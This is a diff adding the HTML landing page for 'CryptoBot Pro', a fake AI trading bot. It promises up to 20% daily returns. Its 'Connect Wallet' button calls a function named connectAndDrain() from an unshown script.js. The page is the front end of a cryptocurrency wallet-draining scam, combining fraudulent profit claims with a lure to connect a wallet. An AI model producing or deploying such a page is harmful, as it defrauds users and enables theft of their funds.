@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoBot Pro - Automated Trading</title>
+    <!-- Use ethers.js for Ethereum compatibility with Phantom -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #1a1a2e;
+            color: #e6e6e6;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        header {
+            background: #0f3460;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+        }
+        h1 {
+            margin: 0;
+            font-size: 36px;
+            color: #00d4ff;
+        }
+        .content {
+            padding: 50px;
+        }
+        .pitch {
+            max-width: 600px;
+            margin: 0 auto 30px;
+            font-size: 18px;
+            line-height: 1.5;
+        }
+        .connect-btn {
+            background: #00d4ff;
+            color: #1a1a2e;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .connect-btn:hover {
+            background: #00b3d9;
+        }
+        #status {
+            margin-top: 20px;
+            color: #ff4c4c;
+            font-weight: bold;
+        }
+        footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>CryptoBot Pro</h1>
+    </header>
+    <div class="content">
+        <div class="pitch">
+            <p>Maximize your profits with our AI-powered trading bot! Earn up to 20% daily returns by connecting your wallet and letting our advanced algorithms trade for you.</p>
+        </div>
+        <button class="connect-btn" onclick="connectAndDrain()">Connect Wallet to Start Trading</button>
+        <p id="status"></p>
+    </div>
+    <footer>
+        <p>© 2025 CryptoBot Pro - All Rights Reserved</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
